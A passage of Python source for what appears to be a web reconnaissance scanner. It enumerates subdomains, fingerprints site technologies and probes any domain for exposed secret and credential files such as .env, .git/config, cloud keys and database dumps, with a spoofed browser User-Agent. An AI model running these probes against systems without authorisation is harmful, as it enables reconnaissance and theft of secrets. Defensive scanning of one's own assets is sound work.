    sensitive_prefixes = {
        "admin", "api", "dev", "staging", "stg", "test", "vpn", "mail", "ftp",
        "db", "database", "jenkins", "gitlab", "jira", "internal", "intranet",
        "portal", "grafana", "kibana", "elastic", "mongo", "redis", "backup",
        "old", "legacy", "beta", "uat", "phpmyadmin", "cpanel", "webmail",
        "sso", "auth", "login", "docker", "k8s", "confluence", "vault",
        "secrets", "prod", "production", "mgmt", "management", "remote", "rdp",
        "ssh", "git", "ci", "cd", "build", "registry", "sentry",
    }

    def resolve_sub(sub):
        try:
            r2 = socket.getaddrinfo(sub, None, socket.AF_INET, socket.SOCK_STREAM)
            ip = r2[0][4][0]
            prefix = sub.replace(f".{domain}", "").split(".")[-1]
            is_sensitive = prefix in sensitive_prefixes
            return {"subdomain": sub, "ip": ip, "alive": True, "sensitive": is_sensitive}
        except Exception:
            return {"subdomain": sub, "ip": "-", "alive": False, "sensitive": False}

    resolved = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        resolved = list(ex.map(resolve_sub, subs[:200]))

    alive = [r for r in resolved if r["alive"]]
    sensitive = [r for r in alive if r["sensitive"]]

    # --- Also pull Certificate Transparency logs (crt.sh) ---
    # Merged here so we have one unified subdomain card
    ct_total = 0
    ct_sensitive = []
    try:
        ct_data = scan_crtsh(domain)
        ct_total = ct_data.get("total", 0)
        # Add any CT-only subs not already in our list
        ct_subs = set(ct_data.get("subdomains", []))
        existing = set(subs)
        ct_only = ct_subs - existing
        if ct_only:
            def resolve_ct(sub):
                try:
                    r2 = socket.getaddrinfo(sub, None, socket.AF_INET, socket.SOCK_STREAM)
                    ip = r2[0][4][0]
                    prefix = sub.replace(f".{domain}", "").split(".")[-1]
                    return {"subdomain": sub, "ip": ip, "alive": True, "sensitive": prefix in sensitive_prefixes}
                except Exception:
                    return {"subdomain": sub, "ip": "-", "alive": False, "sensitive": False}
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                ct_resolved = list(ex.map(resolve_ct, list(ct_only)[:100]))
            resolved.extend(ct_resolved)
            alive = [r for r in resolved if r["alive"]]
            sensitive = [r for r in alive if r["sensitive"]]
            subs = list(existing | ct_subs)
        ct_sensitive = [s["subdomain"] for s in ct_data.get("sensitive", [])]
    except Exception:
        pass

    return {
        "total":         len(subs),
        "alive_count":   len(alive),
        "subdomains":    subs,
        "resolved":      resolved,
        "sensitive":     sensitive,
        "sources_used":  sources_used,
        "sources_failed": sources_failed,
        "ct_total":      ct_total,
        "ct_sensitive":  ct_sensitive,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: WHATWEB (tool + Python fallback)
# ═══════════════════════════════════════════════════════════════

def scan_whatweb(domain):
    """
    Run WhatWeb binary if installed, else fall back to a deep
    pure-Python fingerprinter with 80+ signatures.
    """
    import subprocess
    import shutil

    whatweb_bin = shutil.which("whatweb")
    if whatweb_bin:
        try:
            result = subprocess.run(
                [whatweb_bin, "--color=never", "--no-errors", "-a", "3",
                 f"https://{domain}"],
                capture_output=True, text=True, timeout=30
            )
            output = result.stdout.strip() or result.stderr.strip()
            # Also parse into structured data
            detected = _parse_whatweb_output(output)
            return {
                "source": "whatweb_binary",
                "raw": output[:3000],
                "detected": detected,
            }
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass

    # --- Pure Python fallback ---
    return _whatweb_python(domain)


def _parse_whatweb_output(output):
    """Extract plugin names from whatweb raw output into a list."""
    detected = []
    # WhatWeb output: URL [status] Plugin[version], Plugin2, ...
    match = re.search(r'\[[\d]+\]\s*(.*)', output)
    if match:
        plugins_raw = match.group(1)
        for plugin in re.findall(r'([A-Za-z0-9_\-\.]+)(?:\[([^\]]*)\])?', plugins_raw):
            name, version = plugin
            if name and len(name) > 2:
                entry = name
                if version:
                    entry += f" [{version}]"
                detected.append(entry)
    return detected


def _whatweb_python(domain):
    """Deep Python-based tech fingerprinter — 80+ signatures."""
    if not HAS_REQUESTS:
        return {"error": "requests required", "source": "python_fallback"}

    resp = None
    final_url = ""
    for scheme in ["https", "http"]:
        try:
            resp = requests.get(
                f"{scheme}://{domain}", timeout=12, allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
                                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
            )
            final_url = resp.url
            break
        except Exception:
            continue
    if not resp:
        return {"error": "cannot connect", "source": "python_fallback"}

    body = resp.text[:100000]
    hdrs = dict(resp.headers)
    hdrs_lower = {k.lower(): v for k, v in hdrs.items()}
    cookies = {c.name: c.value for c in resp.cookies}
    combined = body + str(hdrs)

    detected = {}

    SIGNATURES = {
        "CMS": {
            "WordPress":          [r'wp-content/', r'wp-includes/', r'wp-json'],
            "WordPress (login)":  [r'wp-login\.php'],
            "Drupal":             [r'sites/default/files', r'Drupal\.settings', r'/misc/drupal\.js'],
            "Joomla":             [r'/media/jui/', r'Joomla!', r'/components/com_'],
            "Shopify":            [r'cdn\.shopify\.com', r'Shopify\.theme'],
            "Wix":                [r'static\.wixstatic\.com', r'X-Wix-'],
            "Squarespace":        [r'squarespace\.com', r'static\.squarespace\.com'],
            "Webflow":            [r'webflow\.com', r'Webflow'],
            "Magento":            [r'Mage\.Cookies', r'/skin/frontend/', r'var BLANK_URL'],
            "PrestaShop":         [r'prestashop', r'/modules/blockcart/'],
            "OpenCart":           [r'catalog/view/theme', r'route=common/home'],
            "Ghost":              [r'ghost/api', r'content="Ghost '],
            "Typo3":              [r'typo3temp/', r'typo3conf/'],
            "MODX":               [r'modx-Revolution', r'MODx\.'],
            "October CMS":        [r'october/', r'cms::'],
        },
        "E-Commerce": {
            "WooCommerce":        [r'woocommerce', r'wc-api'],
            "BigCommerce":        [r'bigcommerce\.com', r'cdn\.bcapp\.dev'],
            "Ecwid":              [r'ecwid\.com', r'Ecwid\.init'],
            "Stripe":             [r'js\.stripe\.com', r'stripe\.com/v1'],
            "PayPal":             [r'paypal\.com/sdk', r'paypalobjects\.com'],
        },
        "Frontend Framework": {
            "React":              [r'react\.production\.min', r'__REACT_DEVTOOLS', r'_reactFiber'],
            "Vue.js":             [r'vue\.min\.js', r'Vue\.component\(', r'__vue__'],
            "Angular":            [r'ng-version=', r'angular\.min\.js', r'ng-app='],
            "Next.js":            [r'__NEXT_DATA__', r'/_next/static/'],
            "Nuxt.js":            [r'__NUXT__', r'_nuxt/'],
            "Svelte":             [r'__svelte', r'svelte-'],
            "Ember.js":           [r'ember\.min\.js', r'Ember\.Application'],
            "Backbone.js":        [r'backbone\.js', r'Backbone\.Model'],
            "jQuery":             [r'jquery[\.\-][\d]', r'jquery\.min\.js'],
            "Bootstrap":          [r'bootstrap\.min\.css', r'bootstrap\.min\.js', r'class="container"'],
            "Tailwind CSS":       [r'tailwindcss', r'class="[^"]*(?:flex|grid|px-|py-|text-)[^"]*"'],
            "Material UI":        [r'material-ui', r'MuiButton', r'@mui/'],
            "HTMX":               [r'htmx\.org', r'hx-get='],
        },
        "JavaScript Libraries": {
            "Lodash":             [r'lodash\.min\.js', r'_\.VERSION'],
            "Moment.js":          [r'moment\.min\.js', r'moment\.utc'],
            "Axios":              [r'axios\.min\.js'],
            "D3.js":              [r'd3\.min\.js', r'd3-selection'],
            "Chart.js":           [r'chart\.min\.js', r'Chart\.register'],
            "Three.js":           [r'three\.min\.js', r'THREE\.WebGLRenderer'],
            "Socket.io":          [r'socket\.io\.js', r'socket\.io/socket\.io'],
            "Alpine.js":          [r'alpinejs', r'x-data='],
        },
        "Server / Language": {
            "PHP":                [r'\.php["\s?/]', r'PHPSESSID'],
            "ASP.NET":            [r'__VIEWSTATE', r'__EVENTVALIDATION', r'aspnet'],
            "ASP.NET MVC":        [r'__RequestVerificationToken', r'mvc'],
            "Java / JSP":         [r'\.jsp["\s?/]', r'JSESSIONID'],
            "Ruby on Rails":      [r'_session_id', r'X-Runtime.*Ruby'],
            "Django":             [r'csrfmiddlewaretoken', r'django'],
            "Flask":              [r'Werkzeug/', r'flask'],
            "Laravel":            [r'laravel_session', r'Laravel'],
            "Express.js":         [r'X-Powered-By.*Express'],
            "Node.js":            [r'X-Powered-By.*Node'],
            "Python":             [r'X-Powered-By.*Python', r'gunicorn'],
        },
        "CDN / Hosting": {
            "Cloudflare":         [r'cf-ray', r'cloudflare', r'__cfduid'],
            "AWS CloudFront":     [r'cloudfront\.net', r'X-Amz-Cf-Id'],
            "AWS S3":             [r's3\.amazonaws\.com', r'AmazonS3'],
            "Fastly":             [r'Fastly-', r'fastly\.net'],
            "Akamai":             [r'akamaiedge\.net', r'akamai'],
            "Vercel":             [r'vercel\.app', r'x-vercel-'],
            "Netlify":            [r'netlify\.app', r'netlify\.com'],
            "GitHub Pages":       [r'github\.io'],
            "Heroku":             [r'heroku\.com', r'herokuapp\.com'],
            "DigitalOcean":       [r'digitaloceanspaces\.com'],
            "Azure":              [r'azurewebsites\.net', r'azure\.com'],
            "Google Cloud":       [r'storage\.googleapis\.com', r'appspot\.com'],
        },
        "Analytics / Marketing": {
            "Google Analytics":   [r'google-analytics\.com/analytics', r'gtag\('],
            "Google Tag Manager": [r'googletagmanager\.com'],
            "Facebook Pixel":     [r'connect\.facebook\.net', r'fbq\('],
            "Hotjar":             [r'hotjar\.com', r'hjid'],
            "Mixpanel":           [r'mixpanel\.com', r'mixpanel\.track'],
            "Segment":            [r'segment\.com', r'analytics\.js'],
            "Intercom":           [r'intercom\.io', r'Intercom\('],
            "HubSpot":            [r'hubspot\.com', r'hs-scripts'],
            "Drift":              [r'drift\.com', r'driftt\.com'],
            "Zendesk":            [r'zdassets\.com', r'zendesk\.com/embeddable'],
            "Crisp":              [r'crisp\.chat'],
            "Tawk.to":            [r'tawk\.to'],
        },
        "Security": {
            "Cloudflare WAF":     [r'cf-ray'],
            "reCAPTCHA":          [r'recaptcha\.net', r'g-recaptcha'],
            "hCaptcha":           [r'hcaptcha\.com'],
            "Sucuri WAF":         [r'Sucuri', r'sucuri\.net'],
            "Imperva / Incapsula": [r'incapsula', r'Imperva'],
            "Wordfence":          [r'wordfence'],
            "ModSecurity":        [r'Mod_Security', r'NOYB'],
        },
        "Authentication": {
            "Auth0":              [r'auth0\.com', r'cdn\.auth0\.com'],
            "Okta":               [r'okta\.com', r'oktacdn\.com'],
            "Keycloak":           [r'keycloak', r'/auth/realms/'],
            "Firebase Auth":      [r'firebase\.googleapis\.com', r'firebaseapp\.com'],
            "AWS Cognito":        [r'cognito-idp', r'amazoncognito\.com'],
            "OneLogin":           [r'onelogin\.com'],
        },
        "Monitoring / APM": {
            "Sentry":             [r'sentry\.io', r'sentry_key'],
            "Datadog":            [r'datadoghq\.com', r'ddtrace'],
            "New Relic":          [r'newrelic\.com', r'nr-data\.net'],
            "Dynatrace":          [r'dynatrace\.com', r'ruxitagentjs'],
            "Elastic APM":        [r'elastic\.co/guide/en/apm'],
        },
        "API / Backend": {
            "GraphQL":            [r'graphql', r'__schema', r'graphiql'],
            "REST API":           [r'/api/v[0-9]', r'application/json'],
            "gRPC-Web":           [r'grpc-web'],
            "WebSocket":          [r'ws://', r'wss://', r'WebSocket'],
            "Swagger / OpenAPI":  [r'swagger-ui', r'openapi\.json', r'api-docs'],
        },
    }

    version_patterns = {
        "WordPress":   r'wp-includes/js/wp-embed\.min\.js\?ver=([\d\.]+)',
        "jQuery":      r'jquery[\.\-]([\d\.]+)(?:\.min)?\.js',
        "Bootstrap":   r'bootstrap[\.\-]([\d\.]+)(?:\.min)?\.(?:css|js)',
        "PHP":         r'X-Powered-By.*PHP/([\d\.]+)',
        "React":       r'"version":"([\d\.]+)".*react',
        "Next.js":     r'"version":"([\d\.]+)".*next',
    }

    for cat, techs in SIGNATURES.items():
        found = []
        for name, patterns in techs.items():
            for p in patterns:
                if re.search(p, combined, re.IGNORECASE):
                    entry = name
                    # Try to extract version
                    if name in version_patterns:
                        vm = re.search(version_patterns[name], combined, re.IGNORECASE)
                        if vm:
                            entry = f"{name} {vm.group(1)}"
                    found.append(entry)
                    break
        if found:
            detected[cat] = found

    # Pull server/runtime from headers
    srv = hdrs_lower.get("server", "")
    if srv:
        detected.setdefault("Server", []).append(srv)
    pb = hdrs_lower.get("x-powered-by", "")
    if pb:
        detected.setdefault("Runtime", []).append(pb)
    gen = hdrs_lower.get("x-generator", "")
    if gen:
        detected.setdefault("Generator", []).append(gen)

    # Cookie-based hints
    cookie_hints = {
        "PHPSESSID": "PHP Session",
        "JSESSIONID": "Java/Tomcat",
        "ASP.NET_SessionId": "ASP.NET",
        "_rails_session": "Ruby on Rails",
        "laravel_session": "Laravel",
        "django_session": "Django",
        "wordpress_": "WordPress",
        "wp-settings": "WordPress",
    }
    cookie_detected = []
    for ck, hint in cookie_hints.items():
        if any(ck.lower() in c.lower() for c in cookies):
            cookie_detected.append(hint)
    if cookie_detected:
        detected.setdefault("Cookies (hints)", cookie_detected)

    total = sum(len(v) for v in detected.values())
    return {
        "source": "python_fallback",
        "url": final_url,
        "status_code": resp.status_code,
        "total_detected": total,
        "detected": detected,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: NUCLEI (tool-based)
# ═══════════════════════════════════════════════════════════════

def scan_nuclei(domain):
    """
    Vulnerability Scanner — 130+ built-in template checks.
    No external tools required. Pure HTTP-based detection.
    Covers: exposures, misconfigs, CVEs, CMS, cloud, CI/CD, APIs.
    """
    result = _nuclei_manual_checks(domain)
    # nuclei_installed kept for schema compat — always False (no tool needed)
    result["nuclei_installed"] = False
    return result


def _nuclei_manual_checks(domain):
    """
    Lightweight manual exposure checks run when nuclei is not installed.
    Checks 100+ paths inspired by top Nuclei templates:
    exposures, misconfigs, WordPress, admin panels, CVE-based paths, etc.
    """
    if not HAS_REQUESTS:
        return {"error": "requests required", "findings": []}

    EXPOSURE_PATHS = [
        # ── Environment & Secrets (nuclei: exposures/files) ──
        ("/.env",                         "Environment File Exposed",             "critical"),
        ("/.env.local",                   ".env.local Exposed",                   "critical"),
        ("/.env.production",              ".env.production Exposed",              "critical"),
        ("/.env.backup",                  ".env Backup Exposed",                  "critical"),
        ("/.env.dev",                     ".env.dev Exposed",                     "critical"),
        ("/.env.staging",                 ".env.staging Exposed",                 "critical"),
        ("/.env.example",                 ".env.example Exposed",                 "medium"),
        ("/config.env",                   "config.env Exposed",                   "critical"),
        ("/.npmrc",                       ".npmrc (npm credentials) Exposed",     "high"),
        ("/.pyc",                         "Python compiled file Exposed",         "medium"),
        ("/config.yaml",                  "config.yaml Exposed",                  "high"),
        ("/config.yml",                   "config.yml Exposed",                   "high"),
        ("/application.properties",       "Spring Properties Exposed",            "high"),
        ("/application.yml",              "Spring YAML Config Exposed",           "high"),
        ("/settings.py",                  "Django Settings Exposed",              "high"),
        ("/local_settings.py",            "Django Local Settings Exposed",        "critical"),
        ("/secrets.yaml",                 "Secrets YAML Exposed",                 "critical"),
        ("/credentials.json",             "Credentials JSON Exposed",             "critical"),
        ("/service-account.json",         "GCP Service Account Key Exposed",      "critical"),
        ("/firebase.json",                "Firebase Config Exposed",              "high"),
        ("/.firebase",                    ".firebase Config Exposed",             "high"),
        # ── Git / Source Control (nuclei: exposures/git) ──
        ("/.git/config",                  ".git Config Exposed",                  "critical"),
        ("/.git/HEAD",                    ".git HEAD Exposed",                    "critical"),
        ("/.git/COMMIT_EDITMSG",          ".git Commit Message Exposed",          "high"),
        ("/.git/index",                   ".git Index Exposed",                   "high"),
        ("/.git/logs/HEAD",               ".git Log Exposed",                     "high"),
        ("/.gitignore",                   ".gitignore Exposed",                   "low"),
        ("/.svn/entries",                 "SVN Entries Exposed",                  "high"),
        ("/.svn/wc.db",                   "SVN Database Exposed",                 "high"),
        ("/.hg/hgrc",                     "Mercurial Config Exposed",             "high"),
        # ── Database Backups (nuclei: exposures/backups) ──
        ("/backup.sql",                   "SQL Backup Exposed",                   "critical"),
        ("/dump.sql",                     "SQL Dump Exposed",                     "critical"),
        ("/database.sql",                 "Database SQL Exposed",                 "critical"),
        ("/db.sql",                       "DB SQL Backup Exposed",                "critical"),
        ("/backup.zip",                   "Backup ZIP Exposed",                   "critical"),
        ("/backup.tar.gz",                "Backup TAR Exposed",                   "critical"),
        ("/site.tar.gz",                  "Site Archive Exposed",                 "critical"),
        ("/www.tar.gz",                   "www Archive Exposed",                  "critical"),
        ("/db.sqlite",                    "SQLite Database Exposed",              "critical"),
        ("/db.sqlite3",                   "SQLite3 Database Exposed",             "critical"),
        ("/data.db",                      "Data Database Exposed",                "critical"),
        # ── WordPress (nuclei: http/cms/wordpress) ──
        ("/wp-admin/",                    "WordPress Admin Panel",                "medium"),
        ("/wp-login.php",                 "WordPress Login Page",                 "low"),
        ("/wp-config.php.bak",            "WP Config Backup Exposed",             "critical"),
        ("/wp-config.php~",               "WP Config Backup (~) Exposed",         "critical"),
        ("/wp-config.php.orig",           "WP Config Orig Exposed",               "critical"),
        ("/wp-content/debug.log",         "WordPress Debug Log Exposed",          "high"),
        ("/wp-content/uploads/",          "WordPress Uploads Accessible",         "medium"),
        ("/wp-json/wp/v2/users",          "WordPress Users API (REST)",           "medium"),
        ("/wp-json/wp/v2/posts",          "WordPress Posts API (REST)",           "info"),
        ("/xmlrpc.php",                   "WordPress XMLRPC Enabled",             "medium"),
        ("/wp-cron.php",                  "WordPress Cron Exposed",               "low"),
        ("/readme.html",                  "WordPress Readme (version leak)",      "info"),
        ("/license.txt",                  "WordPress License (version leak)",     "info"),
        ("/wp-includes/version.php",      "WordPress Version File Exposed",       "medium"),
        # ── Admin & Control Panels ──
        ("/admin/",                       "Admin Panel",                          "medium"),
        ("/administrator/",               "Administrator Panel",                  "medium"),
        ("/admin/login",                  "Admin Login Page",                     "medium"),
        ("/phpmyadmin/",                  "phpMyAdmin Exposed",                   "critical"),
        ("/pma/",                         "phpMyAdmin (pma) Exposed",             "critical"),
        ("/phpmyadmin/index.php",         "phpMyAdmin Index",                     "critical"),
        ("/adminer.php",                  "Adminer DB Tool Exposed",              "critical"),
        ("/adminer/",                     "Adminer Directory Exposed",            "critical"),
        ("/manager/html",                 "Tomcat Manager Exposed",               "critical"),
        ("/manager/status",               "Tomcat Status Exposed",                "high"),
        ("/jenkins/",                     "Jenkins CI Exposed",                   "high"),
        ("/jenkins/login",                "Jenkins Login",                        "high"),
        ("/grafana/login",                "Grafana Login",                        "high"),
        ("/kibana/",                      "Kibana Dashboard Exposed",             "high"),
        ("/solr/",                        "Apache Solr Admin Exposed",            "high"),
        ("/console",                      "Console Exposed",                      "high"),
        ("/cpanel/",                      "cPanel Exposed",                       "high"),
        ("/webmin/",                      "Webmin Exposed",                       "critical"),
        ("/_profiler/",                   "Symfony Profiler Exposed",             "high"),
        # ── Debug & Information Disclosure ──
        ("/phpinfo.php",                  "phpinfo() Exposed",                    "high"),
        ("/info.php",                     "phpinfo (info.php) Exposed",           "high"),
        ("/test.php",                     "test.php Exposed",                     "medium"),
        ("/server-status",                "Apache server-status Exposed",         "medium"),
        ("/server-info",                  "Apache server-info Exposed",           "medium"),
        ("/trace",                        "HTTP TRACE Enabled",                   "medium"),
        ("/debug",                        "Debug Endpoint Exposed",               "high"),
        ("/debug/vars",                   "Go debug/vars Exposed",                "high"),
        ("/debug/pprof",                  "Go pprof Exposed",                     "high"),
        ("/error_log",                    "Error Log Exposed",                    "high"),
        ("/logs/error.log",               "Error Log File Exposed",               "high"),
        ("/log/error.log",                "Error Log Exposed",                    "high"),
        ("/storage/logs/laravel.log",     "Laravel Log Exposed",                  "high"),
        ("/_/metrics",                    "Metrics Endpoint Exposed",             "medium"),
        # ── Spring Boot Actuator (nuclei: misconfigs/springboot) ──
        ("/actuator",                     "Spring Actuator Root Exposed",         "high"),
        ("/actuator/env",                 "Spring Actuator /env (secrets!)",      "critical"),
        ("/actuator/health",              "Spring Actuator /health",              "medium"),
        ("/actuator/metrics",             "Spring Actuator /metrics",             "medium"),
        ("/actuator/mappings",            "Spring Actuator /mappings",            "medium"),
        ("/actuator/beans",               "Spring Actuator /beans",               "medium"),
        ("/actuator/dump",                "Spring Actuator /dump",                "high"),
        ("/actuator/trace",               "Spring Actuator /trace",               "high"),
        ("/actuator/shutdown",            "Spring Actuator /shutdown (!)",        "critical"),
        # ── API & Documentation ──
        ("/graphql",                      "GraphQL Endpoint",                     "medium"),
        ("/graphiql",                     "GraphiQL IDE Exposed",                 "high"),
        ("/playground",                   "GraphQL Playground Exposed",           "high"),
        ("/swagger-ui.html",              "Swagger UI Exposed",                   "medium"),
        ("/swagger-ui/",                  "Swagger UI (alt) Exposed",             "medium"),
        ("/swagger.json",                 "Swagger JSON Exposed",                 "medium"),
        ("/swagger.yaml",                 "Swagger YAML Exposed",                 "medium"),
        ("/api-docs",                     "OpenAPI Docs Exposed",                 "medium"),
        ("/api-docs.json",                "OpenAPI JSON Exposed",                 "medium"),
        ("/openapi.json",                 "OpenAPI Spec Exposed",                 "medium"),
        ("/openapi.yaml",                 "OpenAPI YAML Exposed",                 "medium"),
        ("/.well-known/openid-configuration", "OIDC Config Exposed",             "low"),
        ("/.well-known/jwks.json",        "JWKS (JWT Keys) Exposed",              "medium"),
        # ── Cloud & Infrastructure ──
        ("/docker-compose.yml",           "Docker Compose File Exposed",          "high"),
        ("/docker-compose.yaml",          "Docker Compose YAML Exposed",          "high"),
        ("/Dockerfile",                   "Dockerfile Exposed",                   "medium"),
        ("/.dockerenv",                   "Docker Environment File",              "medium"),
        ("/kubernetes.yml",               "Kubernetes Config Exposed",            "high"),
        ("/.kube/config",                 "Kubernetes Config File Exposed",       "critical"),
        ("/terraform.tfvars",             "Terraform Vars Exposed",               "critical"),
        ("/terraform.tfstate",            "Terraform State Exposed",              "critical"),
        ("/ansible.cfg",                  "Ansible Config Exposed",               "high"),
        # ── Sensitive Files & Configs ──
        ("/.htpasswd",                    ".htpasswd Credentials Exposed",        "critical"),
        ("/.htaccess",                    ".htaccess Exposed",                    "medium"),
        ("/web.config",                   "IIS web.config Exposed",               "high"),
        ("/WEB-INF/web.xml",              "Java WEB-INF/web.xml Exposed",         "critical"),
        ("/WEB-INF/classes/",             "Java Classes Directory Exposed",       "critical"),
        ("/.DS_Store",                    ".DS_Store (macOS) Exposed",            "medium"),
        ("/Thumbs.db",                    "Thumbs.db Exposed",                    "low"),
        ("/crossdomain.xml",              "crossdomain.xml Present",              "low"),
        ("/clientaccesspolicy.xml",       "Silverlight Policy Exposed",           "low"),
        ("/package.json",                 "package.json Exposed",                 "medium"),
        ("/composer.json",                "composer.json Exposed",                "low"),
        ("/Gemfile",                      "Gemfile Exposed",                      "low"),
        ("/requirements.txt",             "requirements.txt Exposed",             "low"),
        # ── Security & Disclosure ──
        ("/.well-known/security.txt",     "security.txt Present",                 "info"),
        ("/security.txt",                 "security.txt (alt) Present",           "info"),
        ("/robots.txt",                   "robots.txt Present",                   "info"),
        ("/sitemap.xml",                  "sitemap.xml Present",                  "info"),
        # ── CI/CD & DevOps ──
        ("/.travis.yml",                  "Travis CI Config Exposed",             "medium"),
        ("/.circleci/config.yml",         "CircleCI Config Exposed",              "medium"),
        ("/.github/workflows/",           "GitHub Actions Workflows",             "low"),
        ("/Jenkinsfile",                  "Jenkinsfile Exposed",                  "medium"),
        ("/.gitlab-ci.yml",               "GitLab CI Config Exposed",             "medium"),
        # ── Takeover / Orphaned ──
        ("/humans.txt",                   "humans.txt Present",                   "info"),
        ("/CHANGELOG.md",                 "Changelog Exposed (version leak)",     "info"),
        ("/README.md",                    "README Exposed",                       "info"),
        ("/INSTALL.md",                   "Install Guide Exposed",                "low"),
    ]

    findings = []

    # Fingerprint catch-all / WAF so we don't flag the generic 403/404 page
    # that many hosts return for every path.
    base_sigs = _catchall_baseline(domain)

    # Learn the site's own brand from the homepage title. Sites with catch-all
    # routing answer /phpmyadmin/ with their OWN page titled "phpMyAdmin · Site"
    # — that is the site echoing the path, not an exposed product.
    _brand = None
    try:
        _hp = requests.get(f"https://{domain}", timeout=8, verify=False,
                           allow_redirects=True,
                           headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
        _brand = _site_brand(domain, _hp)
    except Exception:
        _brand = _site_brand(domain)

    def check_path(item):
        path, name, severity = item
        for scheme in ["https", "http"]:
            try:
                r = requests.get(
                    f"{scheme}://{domain}{path}",
                    timeout=6,
                    allow_redirects=False,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"},
                    verify=False,
                )
                # Suppress catch-all / WAF responses (same as a random path)
                if _is_catchall(r, base_sigs) or _looks_soft_404(r):
                    return None

                if r.status_code == 200:
                    if len(r.content) < 50:
                        return None
                    # An HTML page from the target's own site that merely echoes
                    # the requested path is not an exposed asset.
                    if _looks_like_html(r.content) and (
                            _echoes_path(r, path) or _is_site_own_page(r, _brand)):
                        return None
                    content = r.text[:500].lower()
                    # Admin panels: require a real login page, not a homepage
                    if path in ("/admin/", "/wp-admin/"):
                        if not any(k in content for k in ("login", "password", "admin", "sign in")):
                            return None
                    # Raw sensitive files: require the actual file content
                    if not _rawfile_validated(path, r.content):
                        return None
                    return {
                        "path": path, "name": name, "severity": severity,
                        "status": r.status_code, "size": len(r.content),
                        "body_fp": _body_fp(r, path),
                        "url": f"{scheme}://{domain}{path}",
                        "description": f"HTTP 200 — {len(r.content)} bytes",
                    }
                elif r.status_code in (401, 403):
                    # Path is blocked, NOT exposed. This is weak signal — report as
                    # low/info only, and never as the original critical severity.
                    demoted = "info" if severity in ("critical", "high") else "low"
                    return {
                        "path": path, "name": name + " (access forbidden — path may exist)",
                        "severity": demoted, "status": r.status_code, "size": len(r.content),
                        "body_fp": _body_fp(r, path),
                        "url": f"{scheme}://{domain}{path}",
                        "description": f"HTTP {r.status_code} — access blocked (not confirmed exposed)",
                    }
                elif r.status_code == 500:
                    return {
                        "path": path, "name": name + " (server error)",
                        "severity": "low", "status": 500, "size": len(r.content),
                        "url": f"{scheme}://{domain}{path}",
                        "description": "HTTP 500 — server error triggered",
                    }
                # 301/302/307/308 and everything else → ignore (redirects are noise)
                break
            except Exception:
                break
        return None

    import requests as req_lib
    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        results = list(ex.map(check_path, EXPOSURE_PATHS))

    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings = sorted(
        [r for r in results if r is not None],
        key=lambda x: severity_order.get(x["severity"], 99)
    )
    findings = _drop_uniform_findings(findings)

    counts = {}
    for f in findings:
        sev = f["severity"]
        counts[sev] = counts.get(sev, 0) + 1

    # ── Version Detection + CVE-based exploit templates ──
    # These do content-matching like real Nuclei templates
    exploit_findings = _nuclei_exploit_templates(domain)
    for ef in exploit_findings:
        findings.append(ef)
        s = ef.get("severity", "info")
        counts[s] = counts.get(s, 0) + 1

    # ── Recent-CVE detection templates (2024-2026) ──
    # Detection-only: fingerprints product exposure / version, no exploitation.
    recent_findings = _nuclei_recent_cve_checks(domain)
    for rf in recent_findings:
        findings.append(rf)
        s = rf.get("severity", "info")
        counts[s] = counts.get(s, 0) + 1

    # ── Rule playbook (nuclei-style matchers) ──
    # Each rule requires product identification AND vulnerability evidence, so
    # these are the highest-confidence findings in the report.
    try:
        rule_sigs = _catchall_baseline(domain)
        rule_findings = _run_vuln_rules(domain, rule_sigs, brand=_brand)
    except Exception:
        rule_findings = []
    # Prefer a validated rule hit over a generic path-list hit for the same path
    rule_paths = {f.get("path") for f in rule_findings}
    if rule_paths:
        removed = [f for f in findings if f.get("path") in rule_paths]
        for f in removed:
            s = f.get("severity", "info")
            counts[s] = max(0, counts.get(s, 0) - 1)
        findings = [f for f in findings if f.get("path") not in rule_paths]
    for rf in rule_findings:
        findings.append(rf)
        s = rf.get("severity", "info")
        counts[s] = counts.get(s, 0) + 1

    findings.sort(key=lambda x: {"critical":0,"high":1,"medium":2,"low":3,"info":4}.get(x.get("severity","info"),5))

    return {
        "total": len(findings),
        "severity_counts": counts,
        "findings": findings,
        "rules_run": len(VULN_RULES) + len(VULN_RULES_EXTENDED),
        "source": "manual_checks",
    }


def _nuclei_recent_cve_checks(domain):
    """
    Recent-CVE DETECTION templates (2024-2026), inspired by ProjectDiscovery's
    nuclei-templates *-detect / version fingerprints.

    IMPORTANT: these are DETECTION-ONLY. They send benign requests and match on
    server banners, exposed endpoints, or leaked version strings so a defender
    can correlate the asset against a known CVE and verify their patch level.
    They do NOT send exploit payloads, auth-bypass sequences, or RCE gadgets.
    """
    if not HAS_REQUESTS:
        return []

    import re as _re
    import threading as _thr
    findings = []
    _tls = _thr.local()
    H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "Accept": "*/*"}
    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    # Fingerprint catch-all / WAF: error pages that echo the requested path make
    # product-name matches fire on every check. Suppress those.
    base_sigs = _catchall_baseline(domain)

    # Homepage baseline — SPAs and catch-all vhosts serve the SAME index page for
    # every unknown path. If a probe returns (almost) the homepage, the path does
    # not really exist, so nothing found in it counts as evidence.
    _home = {"size": -1, "text": ""}
    try:
        _hr = requests.get(f"https://{domain}", headers=H, timeout=6,
                           verify=False, allow_redirects=True)
        _home["size"] = len(_hr.content)
        _home["text"] = (_hr.text or "")[:4000]
    except Exception:
        pass

    def fetch(path, port=None, timeout=6, method="GET"):
        for sch in ("https", "http"):
